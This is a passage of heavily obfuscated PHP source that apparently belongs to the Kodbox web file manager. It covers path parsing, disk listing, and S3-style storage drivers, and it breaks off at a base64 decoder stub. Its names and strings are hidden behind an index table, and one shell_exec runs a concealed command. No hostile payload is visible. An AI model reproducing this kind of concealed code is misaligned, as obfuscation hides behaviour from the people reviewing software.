$¬Á´À•[12], $¬Á´À•[1788] => $¬Á´À•[231], $¬Á´À•[33] => $¬Á´À•[1789] . $ÑÚ¬ïøÜ[$¬Á´À•[478]], $¬Á´À•[1790] => json_encode(array($¬Á´À•[32] => $ÑÚ¬ïøÜ[$¬Á´À•[32]], $¬Á´À•[1791] => timeFloat() - $½Ş úĞô, $¬Á´À•[371] => $×†©çÂ’)))); $ÅŞ„ˆåÓ = $×†©çÂ’ ? $¬Á´À•[1792] . $×†©çÂ’ : $¬Á´À•[12]; self::log($¬Á´À•[1793] . $ÑÚ¬ïøÜ[$¬Á´À•[478]] . $¬Á´À•[178] . $ÅŞ„ˆåÓ); return !0; } public static function valueGet($Ë‚ŒŸè²) { $Ä§Òôì =& $_SERVER[ÅÄÇĞô]; $åÄó‘¼Ğ = $Ä§Òôì[1794]; $¡ùÀàˆÖ = Model($Ä§Òôì[511])->get($Ë‚ŒŸè², $åÄó‘¼Ğ); if (is_null($¡ùÀàˆÖ)) { Model($Ä§Òôì[511])->set($Ä§Òôì[845], $Ä§Òôì[91], $åÄó‘¼Ğ); Model($Ä§Òôì[511])->set($Ä§Òôì[1746], $Ä§Òôì[231], $åÄó‘¼Ğ); $¡ùÀàˆÖ = Model($Ä§Òôì[511])->get($Ë‚ŒŸè², $åÄó‘¼Ğ); } return $¡ùÀàˆÖ; } private static function valueSet($»Ù„Èòü, $âïªÙšê = false) { $†È„Æœ¥ =& $_SERVER[ÅÄÇĞô]; $ûëÅâ»ê = $†È„Æœ¥[1795]; CacheLock::lock($ûëÅâ»ê); $ÓúÍÌîœ = Model($†È„Æœ¥[511])->set($»Ù„Èòü, $âïªÙšê, $†È„Æœ¥[1794]); CacheLock::unlock($ûëÅâ»ê); return $ÓúÍÌîœ; } protected static function log($âèúÇ¤) { write_log($âèúÇ¤, $_SERVER[ÅÄÇĞô][1780]); } private static function cacheClear() { $Õß·²¨Ö =& $_SERVER[ÅÄÇĞô]; Cache::clearMemory(Model($Õß·²¨Ö[511])->cacheKey($Õß·²¨Ö[1794])); Cache::clearMemory(Model($Õß·²¨Ö[511])->cacheKey($Õß·²¨Ö[1796])); Model($Õß·²¨Ö[1765])->cacheClear(); self::closeDatabase(); } } goto câ›©Õ‚Ü; A©óÙ¸ÜÅ¦: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\145\x63\171\143\154\145\175"; const KOD_USER_FAV = "\x7b\165\x73\145\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\151\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\x46\151\x6c\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\x52\157\157\x74\x53\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\x53\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\123\x68\141\x72\145\114\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\145\111\x74\145\155\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\x52\x65\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\x7d"; public static function typeList() { $ãõ†òøò =& $_SERVER[ÅÄÇĞô]; return array($ãõ†òøò[1359] => self::KOD_SOURCE, $ãõ†òøò[1360] => self::KOD_USER_RECYCLE, $ãõ†òøò[1361] => self::KOD_USER_FAV, $ãõ†òøò[1362] => self::KOD_USER_FILE_TAG, $ãõ†òøò[1363] => self::KOD_USER_FILE_TYPE, $ãõ†òøò[1364] => self::KOD_GROUP_ROOT_SELF, $ãõ†òøò[1365] => self::KOD_USER_SHARE, $ãõ†òøò[1366] => self::KOD_USER_SHARE_LINK, $ãõ†òøò[1367] => self::KOD_USER_SHARE_TO_ME, $ãõ†òøò[1368] => self::KOD_SHARE_ITEM, $ãõ†òøò[1369] => self::KOD_SHARE_LINK, $ãõ†òøò[1370] => self::KOD_SEARCH, $ãõ†òøò[1371] => self::KOD_BLOCK, $ãõ†òøò[1372] => self::KOD_IO, $ãõ†òøò[1373] => self::KOD_USER_RECENT, $ãõ†òøò[1374] => self::KOD_USER_DRIVER); } public static function parse($ÂÀ¤º) { $ƒ‚ÆÓö =& $_SERVER[ÅÄÇĞô]; $ÂÀ¤º = self::clear($ÂÀ¤º); $´Ãğ¾Ğœ = array_values(self::typeList()); preg_match($ƒ‚ÆÓö[1375], $ÂÀ¤º, $øÄ“ÊÖ¤); $¬¿è¨ö = array($ƒ‚ÆÓö[499] => !1, $ƒ‚ÆÓö[1376] => !1, $ƒ‚ÆÓö[496] => !1, $ƒ‚ÆÓö[87] => $ÂÀ¤º, $ƒ‚ÆÓö[1274] => !1, $ƒ‚ÆÓö[1273] => $ƒ‚ÆÓö[12]); if (is_array($øÄ“ÊÖ¤) && count($øÄ“ÊÖ¤) == 5) { $Ë³öÊûí = $ƒ‚ÆÓö[1377] . $øÄ“ÊÖ¤[2] . $ƒ‚ÆÓö[405]; if (in_array($Ë³öÊûí, $´Ãğ¾Ğœ)) { $¬¿è¨ö[$ƒ‚ÆÓö[1274]] = $øÄ“ÊÖ¤[1]; $¬¿è¨ö[$ƒ‚ÆÓö[33]] = $Ë³öÊûí; $¬¿è¨ö[$ƒ‚ÆÓö[1378]] = substr($Ë³öÊûí, 1, -1); $¬¿è¨ö[$ƒ‚ÆÓö[478]] = $øÄ“ÊÖ¤[3]; } $¬¿è¨ö[$ƒ‚ÆÓö[1273]] = $øÄ“ÊÖ¤[4]; } $ÅÄ…‹Øô = array($ƒ‚ÆÓö[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¬¿è¨ö[$ƒ‚ÆÓö[1341]] = in_array($¬¿è¨ö[$ƒ‚ÆÓö[33]], $ÅÄ…‹Øô); return $¬¿è¨ö; } public static function isTruePath($ô…ÜôĞ) { $ú¿œ­ª« =& $_SERVER[ÅÄÇĞô]; if (substr($ô…ÜôĞ, 0, 1) != $ú¿œ­ª«[1377]) { return !0; } if (strpos($ô…ÜôĞ, $ú¿œ­ª«[486]) === 0) { return !0; } if (strpos($ô…ÜôĞ, $ú¿œ­ª«[1345]) === 0) { return !0; } if (strpos($ô…ÜôĞ, $ú¿œ­ª«[1379]) === 0) { return !0; } if (strpos($ô…ÜôĞ, $ú¿œ­ª«[1380]) === 0) { return !0; } if (strpos($ô…ÜôĞ, $ú¿œ­ª«[1381]) === 0) { return !0; } return !1; } public static function clear($å³”İ‚®) { $ªûÉÙó¼ =& $_SERVER[ÅÄÇĞô]; $å³”İ‚® = str_replace(array($ªûÉÙó¼[1179], $ªûÉÙó¼[288]), $ªûÉÙó¼[53], $å³”İ‚®); $å³”İ‚® = str_replace($ªûÉÙó¼[100], $ªûÉÙó¼[8], $å³”İ‚®); $Õîü·É’ = $ªûÉÙó¼[1382]; if (substr($å³”İ‚®, 0, 3) == $ªûÉÙó¼[1383]) { $å³”İ‚® = substr($å³”İ‚®, 3); } while (strstr($å³”İ‚®, $Õîü·É’)) { $å³”İ‚® = str_replace($Õîü·É’, $ªûÉÙó¼[8], $å³”İ‚®); } $å³”İ‚® = preg_replace($ªûÉÙó¼[1384], $ªûÉÙó¼[8], $å³”İ‚®); if ($å³”İ‚® == $ªûÉÙó¼[8]) { return $ªûÉÙó¼[8]; } $å³”İ‚® = rtrim($å³”İ‚®, $ªûÉÙó¼[8]); return $å³”İ‚®; } public static function pathTrue($µíÓÆ£) { $æ¡µ¥Ëˆ =& $_SERVER[ÅÄÇĞô]; if (!$µíÓÆ£) { return $æ¡µ¥Ëˆ[12]; } $µíÓÆ£ = str_replace($æ¡µ¥Ëˆ[257], $æ¡µ¥Ëˆ[8], str_replace($æ¡µ¥Ëˆ[1385], $æ¡µ¥Ëˆ[8], $µíÓÆ£)); $µíÓÆ£ = str_replace($æ¡µ¥Ëˆ[257], $æ¡µ¥Ëˆ[8], str_replace($æ¡µ¥Ëˆ[1385], $æ¡µ¥Ëˆ[8], $µíÓÆ£)); if (!strstr($µíÓÆ£, $æ¡µ¥Ëˆ[1383])) { return $µíÓÆ£; } $¨Èñ´¯ = explode($æ¡µ¥Ëˆ[8], $µíÓÆ£); foreach ($¨Èñ´¯ as $ƒ¥Šşã· => $Åô¶ãØ¯) { if ($Åô¶ãØ¯ !== $æ¡µ¥Ëˆ[1386]) { continue; } for ($¾­èğ²µ = $ƒ¥Šşã·; $¾­èğ²µ >= 0; $¾­èğ²µ--) { if ($¨Èñ´¯[$¾­èğ²µ] === $æ¡µ¥Ëˆ[10] || $¨Èñ´¯[$¾­èğ²µ] === $æ¡µ¥Ëˆ[1386] || $¨Èñ´¯[$¾­èğ²µ] === -1) { continue; } if ($¨Èñ´¯[$¾­èğ²µ] === $æ¡µ¥Ëˆ[12]) { $¨Èñ´¯[$ƒ¥Šşã·] = -1; break; } $¨Èñ´¯[$ƒ¥Šşã·] = -1; $¨Èñ´¯[$¾­èğ²µ] = -1; break; } } $ãÌïßÆº = array(); foreach ($¨Èñ´¯ as $Åô¶ãØ¯) { if ($Åô¶ãØ¯ !== -1) { $ãÌïßÆº[] = $Åô¶ãØ¯; } } $®§¤øëÛ = implode($æ¡µ¥Ëˆ[8], $ãÌïßÆº); if (strpos($®§¤øëÛ, $æ¡µ¥Ëˆ[1387]) === 0) { $®§¤øëÛ = $æ¡µ¥Ëˆ[1383] . substr($®§¤øëÛ, strlen($æ¡µ¥Ëˆ[1387])); } return $®§¤øëÛ; } public static function pathUrlClear($óŒ¸¯¦) { $üÛÏ¶ç· =& $_SERVER[ÅÄÇĞô]; if (!$óŒ¸¯¦) { return $óŒ¸¯¦; } $óŒ¸¯¦ = rawurldecode($óŒ¸¯¦); $óŒ¸¯¦ = str_replace($üÛÏ¶ç·[1385], $üÛÏ¶ç·[8], $óŒ¸¯¦); if (strpos($óŒ¸¯¦, $üÛÏ¶ç·[76]) > 0) { $óŒ¸¯¦ = substr($óŒ¸¯¦, 0, strpos($óŒ¸¯¦, $üÛÏ¶ç·[76])); } if (strpos($óŒ¸¯¦, $üÛÏ¶ç·[1388]) > 0) { $óŒ¸¯¦ = substr($óŒ¸¯¦, 0, strpos($óŒ¸¯¦, $üÛÏ¶ç·[1388])); } return $óŒ¸¯¦; } public static function sourceID($˜š·“Ö) { $»›—®ò =& $_SERVER[ÅÄÇĞô]; $şïô†¾ = self::parse($˜š·“Ö); if ($şïô†¾[$»›—®ò[33]] !== self::KOD_SOURCE) { show_json(LNG($»›—®ò[1389]), !1); } return $şïô†¾[$»›—®ò[478]]; } public static function make($Æí¢µ£) { if (!$Æí¢µ£) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Æí¢µ£)); } public static function makeShare($†²‹ëÄ·, $ƒÈê´İ“) { return self::makePath(self::KOD_SHARE_ITEM, $†²‹ëÄ·, $ƒÈê´İ“); } public static function makeFileTypePath($âëŒ ú) { return self::makePath(self::KOD_USER_FILE_TYPE, $âëŒ ú); } public static function makeFileTagPath($Àøµ›‚¹) { return self::makePath(self::KOD_USER_FILE_TAG, $Àøµ›‚¹); } public static function makePath($ŞÀµÃä›, $÷è¢ûìê = '', $•¾õŸáÓ = '') { $õö¯ÌÚø =& $_SERVER[ÅÄÇĞô]; $ÇêÄ Êà = substr($ŞÀµÃä›, 1, -1); $ü‹•±± = $õö¯ÌÚø[1390] . $ÇêÄ Êà . $õö¯ÌÚø[1391] . $÷è¢ûìê . $õö¯ÌÚø[1392]; $ü‹•±± = $•¾õŸáÓ ? $ü‹•±± . $•¾õŸáÓ . $õö¯ÌÚø[8] : $ü‹•±±; return $ü‹•±±; } public static function hashPath($ƒô‰Š²Ó, $ÃÒ£Ş¾Ş = true) { $«ìß…ŸÖ =& $_SERVER[ÅÄÇĞô]; $ËÍ÷ÊäÍ = is_array($ƒô‰Š²Ó) ? $ƒô‰Š²Ó : IO::info($ƒô‰Š²Ó); $ÈûâØß– = _get($ËÍ÷ÊäÍ, $«ìß…ŸÖ[1393], $«ìß…ŸÖ[12]); if (!$ÈûâØß– && isset($ËÍ÷ÊäÍ[$«ìß…ŸÖ[238]])) { $ÈûâØß– = trim($ËÍ÷ÊäÍ[$«ìß…ŸÖ[238]], $«ìß…ŸÖ[121]); } if (!$ÈûâØß– && isset($ËÍ÷ÊäÍ[$«ìß…ŸÖ[194]]) && $ËÍ÷ÊäÍ[$«ìß…ŸÖ[194]]) { $ËÍ÷ÊäÍ = IO::info(KodIO::make($ËÍ÷ÊäÍ[$«ìß…ŸÖ[194]])); $ÈûâØß– = _get($ËÍ÷ÊäÍ, $«ìß…ŸÖ[1393], $«ìß…ŸÖ[12]); } $‹î©ø¦˜ = md5($ËÍ÷ÊäÍ[$«ìß…ŸÖ[87]] . $ËÍ÷ÊäÍ[$«ìß…ŸÖ[79]] . $ËÍ÷ÊäÍ[$«ìß…ŸÖ[88]]); if (!$ÈûâØß– && file_exists($ËÍ÷ÊäÍ[$«ìß…ŸÖ[87]])) { $ÈûâØß– = Cache::get($‹î©ø¦˜ . $«ìß…ŸÖ[1394]); $ÈûâØß– = !1; if (!$ÈûâØß–) { $ÈûâØß– = IO::hashSimple($ËÍ÷ÊäÍ[$«ìß…ŸÖ[87]]); Cache::set($‹î©ø¦˜ . $«ìß…ŸÖ[1394], $ÈûâØß–, 3600 * 24 * 30); } } if ($ÃÒ£Ş¾Ş && !$ÈûâØß–) { } return $ÈûâØß– ? $ÈûâØß– : $‹î©ø¦˜; } public static function hashPathSafe($ßˆ ‰ê, $“Üõ½¯ = true) { $øµÄÅÇø =& $_SERVER[ÅÄÇĞô]; $‚¼ıŠï = self::hashPath($ßˆ ‰ê, $“Üõ½¯); return md5($‚¼ıŠï . $øµÄÅÇø[1395] . Model($øµÄÅÇø[865])->get($øµÄÅÇø[866])); } public static function initSystemPath() { $¢¢ÅÉìµ =& $_SERVER[ÅÄÇĞô]; if (defined($¢¢ÅÉìµ[1396])) { return; } define($¢¢ÅÉìµ[1396], self::systemPath($¢¢ÅÉìµ[192])); define($¢¢ÅÉìµ[1397], self::systemPath($¢¢ÅÉìµ[1398])); define($¢¢ÅÉìµ[1399], self::systemPath($¢¢ÅÉìµ[1400])); define($¢¢ÅÉìµ[1401], self::systemPath($¢¢ÅÉìµ[1402])); IOHistory::bindEvent(); } public static function systemPath($Ñ¦Êö¾¸) { $ƒŒéé =& $_SERVER[ÅÄÇĞô]; $õş®×ºà = $ƒŒéé[1403] . ucfirst($Ñ¦Êö¾¸); $ê§öšˆÌ = Model($ƒŒéé[865])->get($õş®×ºà); if ($ê§öšˆÌ) { return $ê§öšˆÌ; } if ($Ñ¦Êö¾¸ == $ƒŒéé[192]) { $ê§öšˆÌ = self::make(Model($ƒŒéé[925])->systemRootPathAdd($ƒŒéé[613])); } else { $ê§öšˆÌ = self::systemPath($ƒŒéé[192]); $€æİÓ€ = self::sourceID($ê§öšˆÌ); $ê§öšˆÌ = self::make(Model($ƒŒéé[925])->mkdir($€æİÓ€, $Ñ¦Êö¾¸)); } Model($ƒŒéé[865])->set($õş®×ºà, $ê§öšˆÌ); return $ê§öšˆÌ; } public static function systemFolder($ÁÍ„·òï) { $š…üšÔ± = IO_PATH_SYSTEM_SOURCE . $ÁÍ„·òï; $ÔÈŞ‡ÓÈ = Cache::get($š…üšÔ±); if (!$ÔÈŞ‡ÓÈ) { $°œ®ëŠ = IO::infoFullSimple($š…üšÔ±); if (!$°œ®ëŠ) { $ÔÈŞ‡ÓÈ = IO::mkdir($š…üšÔ±, REPEAT_SKIP); } else { $ÔÈŞ‡ÓÈ = $°œ®ëŠ[$_SERVER[ÅÄÇĞô][87]]; } Cache::set($š…üšÔ±, $ÔÈŞ‡ÓÈ, 3600 * 10); } return $ÔÈŞ‡ÓÈ; } public static function defaultDriver() { return Model($_SERVER[ÅÄÇĞô][862])->defaultDriver(); } public static function defaultIO() { $“–å“Å› =& $_SERVER[ÅÄÇĞô]; $ÜÊë¹ºâ = self::defaultDriver(); return $“–å“Å›[1404] . $ÜÊë¹ºâ[$“–å“Å›[478]] . $“–å“Å›[1392]; } public static function defaultDriverInit() { static $‡¢‘ò–´ = false; if ($‡¢‘ò–´) { return $‡¢‘ò–´; } $‡¢‘ò–´ = IO::init(self::defaultIO()); return $‡¢‘ò–´; } public static function fileTypeList() { $Åªô¾¸İ =& $_SERVER[ÅÄÇĞô]; $ø¯–Î©â = $GLOBALS[$Åªô¾¸İ[6]][$Åªô¾¸İ[1405]]; foreach ($ø¯–Î©â as $œ¸¯Ûú => $×›‚ÜË¸) { $àŠÍåŞÎ = $Åªô¾¸İ[1406] . $œ¸¯Ûú; $Æ”èô•Á = LNG($àŠÍåŞÎ); if ($àŠÍåŞÎ != $Æ”èô•Á) { $ø¯–Î©â[$œ¸¯Ûú][$Åªô¾¸İ[32]] = $Æ”èô•Á; } } return $ø¯–Î©â; } public static function diskList($ìÂå¾¿¡ = true) { $ğ®íşÂû = $_SERVER[ÅÄÇĞô][1407]; if ($ìÂå¾¿¡) { $ÇÀ±è—“ = Cache::get($ğ®íşÂû); if (is_array($ÇÀ±è—“)) { return $ÇÀ±è—“; } } $ÇÀ±è—“ = self::diskListGet(); Cache::set($ğ®íşÂû, $ÇÀ±è—“, 60); return $ÇÀ±è—“; } public static function diskListGet() { $çÇ®‰¤¤ =& $_SERVER[ÅÄÇĞô]; $©…­„‰« = array(); if ($GLOBALS[$çÇ®‰¤¤[6]][$çÇ®‰¤¤[1408]] == $çÇ®‰¤¤[1409]) { $—ï§Ÿ‡ = $çÇ®‰¤¤[1410]; for ($Æ°ƒ©§„ = 0; $Æ°ƒ©§„ < strlen($—ï§Ÿ‡); $Æ°ƒ©§„++) { $úçÕ£Üö = $—ï§Ÿ‡[$Æ°ƒ©§„] . $çÇ®‰¤¤[1411]; if (file_exists($úçÕ£Üö)) { $©…­„‰«[] = $úçÕ£Üö; } } return $©…­„‰«; } if (!function_exists($çÇ®‰¤¤[101])) { $©…­„‰«[] = $çÇ®‰¤¤[936]; return $©…­„‰«; } $ğš¼ÆÁ = explode($çÇ®‰¤¤[288], shell_exec($çÇ®‰¤¤[1412])); array_shift($ğš¼ÆÁ); array_pop($ğš¼ÆÁ); $ëı„¥¥ = array($çÇ®‰¤¤[1413], $çÇ®‰¤¤[1414], $çÇ®‰¤¤[1415], $çÇ®‰¤¤[1416], $çÇ®‰¤¤[1417], $çÇ®‰¤¤[1418], $çÇ®‰¤¤[1419], $çÇ®‰¤¤[1420]); foreach ($ğš¼ÆÁ as $Ì­’„‘) { $ƒ”×‡¶Ã = preg_split($çÇ®‰¤¤[1421], $Ì­’„‘); $úçÕ£Üö = $ƒ”×‡¶Ã[count($ƒ”×‡¶Ã) - 1]; if (!strstr($ƒ”×‡¶Ã[0], $çÇ®‰¤¤[1422]) || !$úçÕ£Üö) { continue; } $ÒÅ¤ü‡¡ = rtrim($úçÕ£Üö, $çÇ®‰¤¤[8]) . $çÇ®‰¤¤[8]; if (in_array($ÒÅ¤ü‡¡, $ëı„¥¥)) { continue; } $©…­„‰«[] = $ÒÅ¤ü‡¡; } return $©…­„‰«; } public static function isSameDisk($ı­¬™·ë, $ÛÆßà¬¥) { $ßòÍ¨³¥ =& $_SERVER[ÅÄÇĞô]; if ($GLOBALS[$ßòÍ¨³¥[6]][$ßòÍ¨³¥[1408]] == $ßòÍ¨³¥[1409]) { return strtolower(substr($ı­¬™·ë, 0, 1)) == strtolower(substr($ÛÆßà¬¥, 0, 1)); } $ì–…³ô = stat($ı­¬™·ë); $úˆ•í™Š = stat($ÛÆßà¬¥); if ($ì–…³ô === !1 || $úˆ•í™Š === !1) { return !1; } return $ì–…³ô[$ßòÍ¨³¥[1423]] === $úˆ•í™Š[$ßòÍ¨³¥[1423]]; $ò¤óß = self::diskList(); $ƒ´¤Ø¥ = !1; $ì•ñõˆ› = !1; sort($ò¤óß); $ò¤óß = array_reverse($ò¤óß); $ı­¬™·ë = rtrim($ı­¬™·ë, $ßòÍ¨³¥[8]) . $ßòÍ¨³¥[8]; $ÛÆßà¬¥ = rtrim($ÛÆßà¬¥, $ßòÍ¨³¥[8]) . $ßòÍ¨³¥[8]; foreach ($ò¤óß as $èÖò¾ü) { $ëÎÁŸçÉ = strlen($èÖò¾ü); if (!$ƒ´¤Ø¥ && substr($ı­¬™·ë, 0, $ëÎÁŸçÉ) == $èÖò¾ü) { $ƒ´¤Ø¥ = $èÖò¾ü; } if (!$ì•ñõˆ› && substr($ÛÆßà¬¥, 0, $ëÎÁŸçÉ) == $èÖò¾ü) { $ì•ñõˆ› = $èÖò¾ü; } if ($ƒ´¤Ø¥ && $ì•ñõˆ›) { break; } } return $ƒ´¤Ø¥ === $ì•ñõˆ›; } public static function transferType($ã´ø‹í, $Ë»¢°¹) { $ÇüÃ“èÓ =& $_SERVER[ÅÄÇĞô]; $¥ë¹ŸÆî = self::driverType($ã´ø‹í); $¶×˜®‚© = self::driverType($Ë»¢°¹); if ($¥ë¹ŸÆî[$ÇüÃ“èÓ[33]] == $¶×˜®‚©[$ÇüÃ“èÓ[33]] && $¥ë¹ŸÆî[$ÇüÃ“èÓ[1424]] == $¶×˜®‚©[$ÇüÃ“èÓ[1424]]) { return $ÇüÃ“èÓ[1425]; } if ($¥ë¹ŸÆî[$ÇüÃ“èÓ[33]] == $ÇüÃ“èÓ[970] && $¶×˜®‚©[$ÇüÃ“èÓ[33]] == $ÇüÃ“èÓ[109]) { return $ÇüÃ“èÓ[1302]; } if ($¥ë¹ŸÆî[$ÇüÃ“èÓ[33]] == $ÇüÃ“èÓ[109] && $¶×˜®‚©[$ÇüÃ“èÓ[33]] == $ÇüÃ“èÓ[970]) { return $ÇüÃ“èÓ[110]; } return $ÇüÃ“èÓ[1426]; } public static function driverType($ó¥¥—»ş) { $èûèæ±û =& $_SERVER[ÅÄÇĞô]; $ĞûÓÄš = str_replace($èûèæ±û[1427], $èûèæ±û[12], strtolower($ó¥¥—»ş->getType())); if ($ĞûÓÄš == $èûèæ±û[852] || $ĞûÓÄš == $èûèæ±û[1428] || $ĞûÓÄš == $èûèæ±û[1429]) { $ó¥¥—»ş = self::defaultDriverInit(); } else { if ($ĞûÓÄš == $èûèæ±û[1312] || $ĞûÓÄš == $èûèæ±û[1430]) { $ó¥¥—»ş = IO::init($ó¥¥—»ş->pathParse[$èûèæ±û[1255]]); } } $Û÷çÌÔ³ = $ó¥¥—»ş->path; $ĞûÓÄš = str_replace($èûèæ±û[1427], $èûèæ±û[12], strtolower($ó¥¥—»ş->getType())); if ($ĞûÓÄš == $èûèæ±û[109]) { return array($èûèæ±û[33] => $èûèæ±û[109], $èûèæ±û[1424] => $èûèæ±û[12], $èûèæ±û[87] => $Û÷çÌÔ³, $èûèæ±û[98] => $ó¥¥—»ş); } return array($èûèæ±û[33] => $èûèæ±û[970], $èûèæ±û[1424] => $ó¥¥—»ş->pathDriver, $èûèæ±û[87] => $Û÷çÌÔ³, $èûèæ±û[98] => $ó¥¥—»ş); } public static function pathDriverType($úò…æ¸…) { return $úò…æ¸… ? self::driverType(IO::init($úò…æ¸…)) : !1; } public static function pathDriverLocal($©ù¯ç²Ì) { $Ğñ™—ˆ‘ =& $_SERVER[ÅÄÇĞô]; $¤›òøÒ‰ = $©ù¯ç²Ì ? self::driverType(IO::init($©ù¯ç²Ì)) : !1; return strtolower($¤›òøÒ‰[$Ğñ™—ˆ‘[33]]) == $Ğñ™—ˆ‘[109] ? !0 : !1; } public static function allowCover($à–°©“•, $‚ş’Ü¦û = true) { $¢Ú²·†“ =& $_SERVER[ÅÄÇĞô]; if (is_string($à–°©“•)) { $à–°©“• = IO::info($à–°©“•); } if (!$à–°©“• || $à–°©“•[$¢Ú²·†“[33]] == $¢Ú²·†“[78] || $à–°©“•[$¢Ú²·†“[79]] <= 100) { return !1; } if (isset($à–°©“•[$¢Ú²·†“[1431]]) || !$à–°©“•[$¢Ú²·†“[87]]) { return !1; } if (isset($à–°©“•[$¢Ú²·†“[235]]) && !$à–°©“•[$¢Ú²·†“[235]]) { return !1; } static $±çÑà¬á = false; if (!$±çÑà¬á || !$‚ş’Ü¦û) { $ÒÁ¼²°º = self::driverType(IO::init($à–°©“•[$¢Ú²·†“[87]])); $—µ¤Á³ = $ÒÁ¼²°º[$¢Ú²·†“[98]]; $±çÑà¬á = $¢Ú²·†“[197]; if ($ÒÁ¼²°º[$¢Ú²·†“[33]] == $¢Ú²·†“[109]) { $±çÑà¬á = $¢Ú²·†“[1432]; } if ($ÒÁ¼²°º[$¢Ú²·†“[98]] && is_array($ÒÁ¼²°º[$¢Ú²·†“[98]]->config)) { $˜õ»“»¹ = $ÒÁ¼²°º[$¢Ú²·†“[98]]->config; if (isset($˜õ»“»¹[$¢Ú²·†“[1433]]) && $˜õ»“»¹[$¢Ú²·†“[1433]]) { $±çÑà¬á = $¢Ú²·†“[1432]; } } $¢õ»—éÌ = KodIO::defaultDriver(); if (strtolower($¢õ»—éÌ[$¢Ú²·†“[98]]) == $¢Ú²·†“[109] && is_array($¢õ»—éÌ[$¢Ú²·†“[6]])) { $Ÿı“À† = $¢õ»—éÌ[$¢Ú²·†“[6]][$¢Ú²·†“[1285]]; if (substr($Ÿı“À†, 0, 2) == $¢Ú²·†“[1434]) { $Ÿı“À† = str_replace($¢Ú²·†“[1434], BASIC_PATH, $Ÿı“À†); } $Ÿı“À† = str_replace($¢Ú²·†“[257], $¢Ú²·†“[8], $Ÿı“À†); if (substr($à–°©“•[$¢Ú²·†“[87]], 0, strlen($Ÿı“À†)) == $Ÿı“À†) { $±çÑà¬á = $¢Ú²·†“[197]; } } } return $±çÑà¬á == $¢Ú²·†“[1432] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($²ĞÎ‰ÜË) { parent::__construct($²ĞÎ‰ÜË); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($¸õ›†Óß) { $¡ê‡âÃ½ =& $_SERVER[ÅÄÇĞô]; if (substr($¸õ›†Óß, 0, 7) == $¡ê‡âÃ½[219]) { $¸õ›†Óß = $¡ê‡âÃ½[220] . substr($¸õ›†Óß, 7); } header($¡ê‡âÃ½[175] . $¸õ›†Óß); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($×Ä¶¹¬Ö) { parent::__construct($×Ä¶¹¬Ö); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } public function uploadFormData($¸Âñ»š, $àö§»î› = 3600) { $»‚àü¡¢ =& $_SERVER[ÅÄÇĞô]; $ŸèçÏ« = $»‚àü¡¢[232]; $’°òâŒ§ = $»‚àü¡¢[1435]; $É½¥ş¦Ã = $»‚àü¡¢[264]; $‡¦Î¶ê = gmdate($»‚àü¡¢[1436], time() + $àö§»î›); $ä¥•í = (string) time() . $»‚àü¡¢[74] . (string) (time() + $àö§»î›); $£”Š¡´¤ = array($»‚àü¡¢[265] => $‡¦Î¶ê, $»‚àü¡¢[268] => array(array($»‚àü¡¢[309] => $ŸèçÏ«), array($»‚àü¡¢[269] => $this->bucket), array($»‚àü¡¢[270], $»‚àü¡¢[271], $»‚àü¡¢[12]), array($»‚àü¡¢[273] => $É½¥ş¦Ã), array($»‚àü¡¢[1437] => $’°òâŒ§), array($»‚àü¡¢[1438] => $this->accessKey), array($»‚àü¡¢[1439] => $ä¥•í))); $£”Š¡´¤ = json_encode($£”Š¡´¤); $óË„Ğè­ = hash_hmac($»‚àü¡¢[1435], $ä¥•í, $this->secret); $½ìâ‰°ß = sha1($£”Š¡´¤); $¹»Ê¹îÌ = hash_hmac($»‚àü¡¢[1435], $½ìâ‰°ß, $óË„Ğè­); $Óï›Í¥è = array($»‚àü¡¢[309] => $ŸèçÏ«, $»‚àü¡¢[273] => $É½¥ş¦Ã, $»‚àü¡¢[280] => base64_encode($£”Š¡´¤), $»‚àü¡¢[1437] => $’°òâŒ§, $»‚àü¡¢[1438] => $this->accessKey, $»‚àü¡¢[1440] => $ä¥•í, $»‚àü¡¢[1441] => $¹»Ê¹îÌ, $»‚àü¡¢[209] => $this->getHost()); return $Óï›Í¥è; } public function fileOutImage($¨Â³–ô“, $ü¨Ï¼Ó¬ = 250) { $‘¶€ó„‚ =& $_SERVER[ÅÄÇĞô]; if ($this->size($¨Â³–ô“) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¨Â³–ô“, $ü¨Ï¼Ó¬); } $²¦°ğ•» = $this->link($¨Â³–ô“); $²¦°ğ•» .= $‘¶€ó„‚[1442] . $ü¨Ï¼Ó¬ . $‘¶€ó„‚[1443]; $this->fileOutLink($²¦°ğ•»); } public function fileOutLink($±áòæ¨) { $­ÛåÃ´á =& $_SERVER[ÅÄÇĞô]; if (substr($±áòæ¨, 0, 7) == $­ÛåÃ´á[219]) { $±áòæ¨ = $­ÛåÃ´á[220] . substr($±áòæ¨, 7); } header($­ÛåÃ´á[175] . $±áòæ¨); die; } } goto d ì‰ãî•’; Ağßâ„§ãİ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = 